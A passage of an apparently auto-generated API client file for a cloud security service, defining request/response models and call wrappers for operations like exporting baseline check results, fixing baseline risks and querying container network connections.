model ExportWarningResponseBody = {
  fileName?: string(name='FileName', description='The name of the file that contains exported baseline check results.', example='health_check_export_20220407'),
  id?: long(name='Id', description='The ID of the task to export baseline check results.

> You can call use the value of this parameter to call the [DescribeHcExportInfo](~~DescribeHcExportInfo~~) operation to query the export progress.', example='439316'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A7FC828B-C242-1005-9736-C7CC5DC09FF0'),
}

model ExportWarningResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ExportWarningResponseBody(name='body'),
}

/**
 * @summary Exports baseline check results.
 *
 * @param request ExportWarningRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ExportWarningResponse
 */
async function exportWarningWithOptions(request: ExportWarningRequest, runtime: Util.RuntimeOptions): ExportWarningResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.isCleartextPwd)) {
    query['IsCleartextPwd'] = request.isCleartextPwd;
  }
  if (!Util.isUnset(request.isSummaryExport)) {
    query['IsSummaryExport'] = request.isSummaryExport;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskIds)) {
    query['RiskIds'] = request.riskIds;
  }
  if (!Util.isUnset(request.riskLevels)) {
    query['RiskLevels'] = request.riskLevels;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.subTypeNames)) {
    query['SubTypeNames'] = request.subTypeNames;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.typeNames)) {
    query['TypeNames'] = request.typeNames;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportWarning',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Exports baseline check results.
 *
 * @param request ExportWarningRequest
 * @return ExportWarningResponse
 */
async function exportWarning(request: ExportWarningRequest): ExportWarningResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportWarningWithOptions(request, runtime);
}

model FindContainerNetworkConnectRequest {
  criteriaType?: string(name='CriteriaType', description='The type of the information that you want to query. Valid values:

*   **EDGE**: connection information', example='EDGE'),
  currentPage?: long(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dstNode?: {
    appName?: string(name='AppName', description='The name of the container application.', example='nginx-ingress-controller'),
    clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='f5x833820xx'),
    namespace?: string(name='Namespace', description='The namespace of the cluster.', example='default'),
    nodeIds?: [ string ](name='NodeIds', description='The node IDs.'),
    nodeType?: string(name='NodeType', description='The type of the node. Valid values:

*   **app**: application, which indicates that the node type is application.', example='app'),
    podName?: string(name='PodName', description='The name of the pod.', example='abc-deployment-yacs-31144-39265-1384966-7f8c8cd578-h6mhb'),
  }(name='DstNode', description='The information about the destination node.'),
  endTime?: long(name='EndTime', description='The end time of the network connection.', example='1649260799999'),
  pageSize?: long(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  srcNode?: {
    appName?: string(name='AppName', description='The name of the container application.', example='arms-prometheus-ack-arms-prometheus'),
    clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c56xxx1775dea0'),
    namespace?: string(name='Namespace', description='The namespace of the cluster.', example='default'),
    nodeIds?: [ string ](name='NodeIds', description='The node IDs.'),
    nodeType?: string(name='NodeType', description='The type of the node. Valid values:

*   **app**: application, which indicates that the node type is application.', example='app'),
    podName?: string(name='PodName', description='The name of the pod.', example='abc-deployment-yacs-31144-39265-1384966-7f8c8cd578-h6mhb'),
  }(name='SrcNode', description='The information about the source node.'),
  startTime?: long(name='StartTime', description='The start time of the network connection.', example='1666886400000'),
}

model FindContainerNetworkConnectShrinkRequest {
  criteriaType?: string(name='CriteriaType', description='The type of the information that you want to query. Valid values:

*   **EDGE**: connection information', example='EDGE'),
  currentPage?: long(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dstNodeShrink?: string(name='DstNode', description='The information about the destination node.'),
  endTime?: long(name='EndTime', description='The end time of the network connection.', example='1649260799999'),
  pageSize?: long(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  srcNodeShrink?: string(name='SrcNode', description='The information about the source node.'),
  startTime?: long(name='StartTime', description='The start time of the network connection.', example='1666886400000'),
}

model FindContainerNetworkConnectResponseBody = {
  connects?: [ 
    {
      dstContainer?: {
        containerId?: string(name='ContainerId', description='The ID of the destination container.', example='48a6dxxx9d5a5866'),
      }(name='DstContainer', description='The information about the destination container.

> This parameter is not supported.'),
      dstIp?: string(name='DstIp', description='The destination IP address.', example='172.20.62.176'),
      dstPort?: string(name='DstPort', description='The destination port.', example='443'),
      firstTime?: long(name='FirstTime', description='The timestamp when the connection was first established.', example='2022-11-11 20:54:32'),
      id?: long(name='Id', description='The ID of the network connection.', example='1458'),
      lastTime?: long(name='LastTime', description='The timestamp when the connection was last established.', example='2022-11-24 10:26:00'),
      srcContainer?: {
        containerId?: string(name='ContainerId', description='The ID of the source container.', example='48a6xxx5709d5a5866'),
      }(name='SrcContainer', description='The information about the source container.

> This parameter is not supported.'),
      srcIp?: string(name='SrcIp', description='The source IP address.', example='35.233.62.116'),
      srcPort?: string(name='SrcPort', description='The source port.', example='10240'),
    }
  ](name='Connects', description='The information about the network connections.'),
  pageInfo?: {
    count?: long(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: long(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: long(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: long(name='TotalCount', description='The total number of entries returned.', example='12'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8686CE6E-9BFA-5436-A9D9-77B984AEE7F8'),
}

model FindContainerNetworkConnectResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: FindContainerNetworkConnectResponseBody(name='body'),
}

/**
 * @summary 容器网络连接
 *
 * @param tmpReq FindContainerNetworkConnectRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return FindContainerNetworkConnectResponse
 */
async function findContainerNetworkConnectWithOptions(tmpReq: FindContainerNetworkConnectRequest, runtime: Util.RuntimeOptions): FindContainerNetworkConnectResponse {
  Util.validateModel(tmpReq);
  var request = new FindContainerNetworkConnectShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstNode)) {
    request.dstNodeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstNode, 'DstNode', 'json');
  }
  if (!Util.isUnset(tmpReq.srcNode)) {
    request.srcNodeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcNode, 'SrcNode', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dstNodeShrink)) {
    query['DstNode'] = request.dstNodeShrink;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.srcNodeShrink)) {
    query['SrcNode'] = request.srcNodeShrink;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'FindContainerNetworkConnect',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 容器网络连接
 *
 * @param request FindContainerNetworkConnectRequest
 * @return FindContainerNetworkConnectResponse
 */
async function findContainerNetworkConnect(request: FindContainerNetworkConnectRequest): FindContainerNetworkConnectResponse {
  var runtime = new Util.RuntimeOptions{};
  return findContainerNetworkConnectWithOptions(request, runtime);
}

model FinishGuidTaskRequest {
  taskTypeName?: string(name='TaskTypeName', description='The name of the task type.

This parameter is required.', example='guide_sub_task_config_add_collection'),
}

model FinishGuidTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='08DCAABC-82E7-5EF5-A9E7-A82DC07C****'),
}

model FinishGuidTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: FinishGuidTaskResponseBody(name='body'),
}

/**
 * @summary Completes guidance tasks for beginners to earn rewards.
 *
 * @param request FinishGuidTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return FinishGuidTaskResponse
 */
async function finishGuidTaskWithOptions(request: FinishGuidTaskRequest, runtime: Util.RuntimeOptions): FinishGuidTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskTypeName)) {
    query['TaskTypeName'] = request.taskTypeName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'FinishGuidTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Completes guidance tasks for beginners to earn rewards.
 *
 * @param request FinishGuidTaskRequest
 * @return FinishGuidTaskResponse
 */
async function finishGuidTask(request: FinishGuidTaskRequest): FinishGuidTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return finishGuidTaskWithOptions(request, runtime);
}

model FixCheckWarningsRequest {
  checkParams?: string(name='CheckParams', description='The parameters for the baseline risk item that you want to fix.

*   **checkId**: the ID of the check item that corresponds to the baseline risk item.

*   **rules**: an array that consists of the rules applied to fixes.

    *   **value**: specifies whether a fix method is selected. Valid values: **0** and **1**. The value 0 indicates that no fix method is selected and the value 1 indicates that a fix method is selected.
    *   **ruleId**: the ID of the fix method.
    *   **paramList**: an array that consists of the details about the fix method.\\\\
        • **paramName**: the name of the fix method.\\\\
        • **value**: the value of the fix method.

This parameter is required.', example='[{"checkId":8,"rules":[{"ruleId":"rule.ssh_Idle.interval","value":1,"paramList":[{"paramName":"range_val","value":"600"},{"paramName":"range_val","value":"600"}]},{"ruleId":"rule.ssh_Idle.count","value":1,"paramList":[{"paramName":"range_val","value":"3"}]}]}]'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  retentionDays?: int32(name='RetentionDays', description='The retention period of the snapshot that is created when you fix the baseline risk. Valid values: 1 to 365. Unit: days.', example='1'),
  riskId?: long(name='RiskId', description='The ID of the risk item.

>  To query the information about the risk items and check items of a server, you must specify the IDs of the risk items. You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of risk items.', example='10354'),
  snapshotName?: string(name='SnapshotName', description='The name of the snapshot that is created when you fix the baseline risk.', example='sas_fix_2024-12-04'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='165.225.XX.XX'),
  uuids?: string(name='Uuids', description='The UUID of the asset for which you want to fix the baseline risk item. You can call the [DescribeWarningMachines](~~DescribeWarningMachines~~) operation to query the UUIDs of assets.', example='75a417dda5f25edb5bed8f208a9a****,c7e10fd794262a1510d5648f9e5d****'),
}

model FixCheckWarningsResponseBody = {
  batchId?: long(name='BatchId', description='The ID of the baseline risk item that has been fixed by using the Batch Repair feature.', example='52370'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='76C1D7FD-DB1E-45EA-B804-3FBD9A1DD9C0'),
}

model FixCheckWarningsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: FixCheckWarningsResponseBody(name='body'),
}

/**
 * @summary Fixes a baseline risk item.
 *
 * @param request FixCheckWarningsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return FixCheckWarningsResponse
 */
async function fixCheckWarningsWithOptions(request: FixCheckWarningsRequest, runtime: Util.RuntimeOptions): FixCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkParams)) {
    query['CheckParams'] = request.checkParams;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.retentionDays)) {
    query['RetentionDays'] = request.retentionDays;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.snapshotName)) {
    query['SnapshotName'] = request.snapshotName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'FixCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Fixes a baseline risk item.
 *
 * @param request FixCheckWarningsRequest
 * @return FixCheckWarningsResponse
 */
async function fixCheckWarnings(request: FixCheckWarningsRequest): FixCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return fixCheckWarningsWithOptions(request, runtime);
}

model GenerateDynamicDictRequest {
  argKeywords?: string(name='ArgKeywords', description='The keyword of the dictionary.', example='keyword'),
  domains?: string(name='Domains', description='The domain name for custom weak passwords.', example='https://www.aliyun.com'),
  names?: string(name='Names', description='The company name for custom weak passwords.', example='Alibaba'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='58.248.XX.XX'),
}

model GenerateDynamicDictResponseBody = {
  keywordList?: [ string ](name='KeywordList', description='The custom weak passwords.'),
  requestId?: string(name='RequestId', description='The request ID.', example='00E9B912-6066-5E4E-9F24-35EA09F2****'),
}

model GenerateDynamicDictResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GenerateDynamicDictResponseBody(name='body'),
}

/**
 * @summary Generates a custom dictionary of weak passwords for the baseline check feature.
 *
 * @param request GenerateDynamicDictRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GenerateDynamicDictResponse
 */
async function generateDynamicDictWithOptions(request: GenerateDynamicDictRequest, runtime: Util.RuntimeOptions): GenerateDynamicDictResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.argKeywords)) {
    query['ArgKeywords'] = request.argKeywords;
  }
  if (!Util.isUnset(request.domains)) {
    query['Domains'] = request.domains;
  }
  if (!Util.isUnset(request.names)) {
    query['Names'] = request.names;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GenerateDynamicDict',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Generates a custom dictionary of weak passwords for the baseline check feature.
 *
 * @param request GenerateDynamicDictRequest
 * @return GenerateDynamicDictResponse
 */
async function generateDynamicDict(request: GenerateDynamicDictRequest): GenerateDynamicDictResponse {
  var runtime = new Util.RuntimeOptions{};
  return generateDynamicDictWithOptions(request, runtime);
}

model GenerateK8sAccessInfoRequest {
  aliyunYundunGatewayApiName?: string(name='AliyunYundunGatewayApiName', description='This parameter is deprecated.', example='None'),
  aliyunYundunGatewayPopName?: string(name='AliyunYundunGatewayPopName', description='This parameter is deprecated.', example='None'),
  aliyunYundunGatewayProjectName?: string(name='AliyunYundunGatewayProjectName', description='This parameter is deprecated.', example='None'),
  auditLogStore?: string(name='AuditLogStore', description='The Simple Log Service Logstore that is used to store the audit logs.', example='audit-cf6baf6afa106eca665296fdf68b65bf'),
  auditProject?: string(name='AuditProject', description='The Simple Log Service project that is used to store the audit logs.', example='k8s-log-custom-huxintest1018-2'),
  auditRegionId?: string(name='AuditRegionId', description='The ID of the region in which the audit logs are stored.', example='cn-hangzhou'),
  clusterName?: string(name='ClusterName', description='The name of the Kubernetes cluster.

This parameter is required.', example='test'),
  expireDate?: long(name='ExpireDate', description='The time at which the container ends to be added.

This parameter is required.', example='1711951508388'),
  groupId?: long(name='GroupId', description='The group ID.

This parameter is required.', example='11341690'),
  vendor?: string(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **Tencent**
*   **HUAWEICLOUD**
*   **Azure**
*   **AWS**
*   **Others**

This parameter is required.', example='Tencent'),
}

model GenerateK8sAccessInfoResponseBody = {
  data?: {
    aliUid?: long(name='AliUid', description='The ID of the Alibaba Cloud account.', example='1766185894104***'),
    auditLogStore?: string(name='AuditLogStore', description='The Simple Log Service Logstore that is used to store the audit logs.', example='audit-cf6baf6afa106eca665296fdf68b65bf'),
    auditProject?: string(name='AuditProject', description='The Simple Log Service project that is used to store the audit logs.', example='k8s-log-custom-your-project-sd89ehaaa'),
    auditRegionId?: string(name='AuditRegionId', description='The ID of the region in which the server is deployed.', example='cn-hangzhou'),
    clusterId?: string(name='ClusterId', description='The cluster ID.', example='c8ca91e0907d94efaba7fb0827eb9****'),
    clusterName?: string(name='ClusterName', description='The cluster name.', example='test'),
    expireDate?: long(name='ExpireDate', description='The expiration time. Unit: milliseconds.', example='1804230578566'),
    groupId?: string(name='GroupId', description='The server group ID.', example='11618788'),
    installKey?: string(name='InstallKey', description='The installation key of the server.', example='BC66185***'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='061955B2-BC40-589F-AF63-C40A901EE279'),
}

model GenerateK8sAccessInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GenerateK8sAccessInfoResponseBody(name='body'),
}

/**
 * @summary Generates a command that is used to add a self-managed Kubernetes cluster.
 *
 * @param request GenerateK8sAccessInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GenerateK8sAccessInfoResponse
 */
async function generateK8sAccessInfoWithOptions(request: GenerateK8sAccessInfoRequest, runtime: Util.RuntimeOptions): GenerateK8sAccessInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliyunYundunGatewayApiName)) {
    query['AliyunYundunGatewayApiName'] = request.aliyunYundunGatewayApiName;
  }
  if (!Util.isUnset(request.aliyunYundunGatewayPopName)) {
    query['AliyunYundunGatewayPopName'] = request.aliyunYundunGatewayPopName;
  }
  if (!Util.isUnset(request.aliyunYundunGatewayProjectName)) {
    query['AliyunYundunGatewayProjectName'] = request.aliyunYundunGatewayProjectName;
  }
  if (!Util.isUnset(request.auditLogStore)) {
    query['AuditLogStore'] = request.auditLogStore;
  }
  if (!Util.isUnset(request.auditProject)) {
    query['AuditProject'] = request.auditProject;
  }
  if (!Util.isUnset(request.auditRegionId)) {
    query['AuditRegionId'] = request.auditRegionId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.expireDate)) {
    query['ExpireDate'] = request.expireDate;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GenerateK8sAccessInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Generates a command that is used to add a self-managed Kubernetes cluster.
 *
 * @param request GenerateK8sAccessInfoRequest
 * @return GenerateK8sAccessInfoResponse
 */
async function generateK8sAccessInfo(request: GenerateK8sAccessInfoRequest): GenerateK8sAccessInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return generateK8sAccessInfoWithOptions(request, runtime);
}

model GenerateOnceTaskRequest {
  param?: string(name='Param', description='The additional information.

This parameter is required.', example='{"mode":1,"problemType":"offline","uuids":"inet-795dcad1-360f-49d2-b01e-b7da7f1c****"}'),
  source?: string(name='Source', description='The source of the scan task.', example='Manual'),
  taskName?: string(name='TaskName', description='The name of the scan task. Valid values:

*   **CLIENT_PROBLEM_CHECK**: a client diagnosis task
*   **CLIENT_DEV_OPS**: an O\\\\&M task of Cloud Assistant
*   **ASSET_SECURITY_CHECK**: a task of asset information collection

This parameter is required.', example='CLIENT_PROBLEM_CHECK'),
  taskType?: string(name='TaskType', description='The type of the scan task. Valid values:

*   **CLIENT_PROBLEM_CHECK**: a client diagnosis task
*   **CLIENT_DEV_OPS**: an O\\\\&M task of Cloud Assistant
*   **ASSET_SECURITY_CHECK**: a task of asset information collection

This parameter is required.', example='CLIENT_PROBLEM_CHECK'),
}

model GenerateOnceTaskResponseBody = {
  canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more scan tasks. Valid values:

*   **true**: yes
*   **false**: no

> By default, a maximum of 10 scan tasks can be running at the same time. If 10 image scan tasks are running, you cannot create a scan task by calling this operation. You must wait for at least one of the 10 existing scan tasks to complete before you can create a scan task.', example='true'),
  collectTime?: long(name='CollectTime', description='The collection time.', example='1670307567000'),
  finishCount?: int32(name='FinishCount', description='The number of scan tasks that are complete.', example='61'),
  lastTask?: string(name='LastTask', description='The ID of the last scan task.', example='38730bb078f4a1461d4ed283994c****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8BB6B8FA-39E8-5654-A309-8EED13B1****'),
  taskId?: string(name='TaskId', description='The ID of the scan task.', example='38730bb078f4a1461d4ed283994c****'),
  totalCount?: int32(name='TotalCount', description='The total number of scan tasks.', example='100'),
}

model GenerateOnceTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GenerateOnceTaskResponseBody(name='body'),
}

/**
 * @summary Creates a one-time scan task.
 *
 * @param request GenerateOnceTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GenerateOnceTaskResponse
 */
async function generateOnceTaskWithOptions(request: GenerateOnceTaskRequest, runtime: Util.RuntimeOptions): GenerateOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GenerateOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a one-time scan task.
 *
 * @param request GenerateOnceTaskRequest
 * @return GenerateOnceTaskResponse
 */
async function generateOnceTask(request: GenerateOnceTaskRequest): GenerateOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return generateOnceTaskWithOptions(request, runtime);
}

model GetAccountLabelRequest {
  labelList?: [ string ](name='LabelList', description='The tags.

This parameter is required.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model GetAccountLabelResponseBody = {
  accountLabelList?: [ 
    {
      labelSeries?: string(name='LabelSeries', description='The tag information.', example='SasStep'),
      labelStatus?: boolean(name='LabelStatus', description='Indicates whether the tag is valid.

*   **true**
*   **false**', example='true'),
    }
  ](name='AccountLabelList', description='The tag list.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model GetAccountLabelResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAccountLabelResponseBody(name='body'),
}

/**
 * @summary Obtains account tags.
 *
 * @param request GetAccountLabelRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAccountLabelResponse
 */
async function getAccountLabelWithOptions(request: GetAccountLabelRequest, runtime: Util.RuntimeOptions): GetAccountLabelResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.labelList)) {
    query['LabelList'] = request.labelList;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAccountLabel',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains account tags.
 *
 * @param request GetAccountLabelRequest
 * @return GetAccountLabelResponse
 */
async function getAccountLabel(request: GetAccountLabelRequest): GetAccountLabelResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAccountLabelWithOptions(request, runtime);
}

model GetAegisContainerPluginRuleRequest {
  id?: string(name='Id', description='The ID of the defense rule against container escapes.

>  You can call the [ListAegisContainerPluginRule](~~ListAegisContainerPluginRule~~) operation to obtain the ID.', example='1141****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  ruleType?: int32(name='RuleType', description='The type of the rule. Valid values:

*   **0**: custom rule
*   **1**: system rule', example='0'),
}

model GetAegisContainerPluginRuleResponseBody = {
  data?: {
    gmtCreate?: long(name='GmtCreate', description='The timestamp when the rule was created. Unit: milliseconds.', example='1671607025000'),
    gmtModified?: long(name='GmtModified', description='The timestamp when the rule was modified. Unit: milliseconds.', example='1671607025000'),
    mode?: int32(name='Mode', description='The action mode of the rule. Valid values:

*   **0**: allows escape behavior.
*   **1**: triggers alerts.
*   **2**: blocks escape behavior.', example='1'),
    ruleDescription?: string(name='RuleDescription', description='The description of the rule.', example='autoTest'),
    ruleId?: long(name='RuleId', description='The ID of the rule.', example='21**'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='auto_test_rule-EmzIXZ'),
    ruleTemplateId?: string(name='RuleTemplateId', description='The template ID of the rule.', example='100**'),
    ruleTemplateName?: string(name='RuleTemplateName', description='The template name of the rule.', example='template01'),
    selectedPolicy?: [ string ](name='SelectedPolicy', description='The rule items.'),
    switchId?: string(name='SwitchId', description='The ID of the switch.', example='USER-CONTAINER-RULE-SWITCH-TYPE_***'),
    whiteImages?: [ string ](name='WhiteImages', description='The images that are added to the whitelist.'),
  }(name='Data', description='The returned data.'),
  requestId?: string(name='RequestId', description='The request ID.', example='09969D2C-***0DEF8BF6F'),
}

model GetAegisContainerPluginRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAegisContainerPluginRuleResponseBody(name='body'),
}

/**
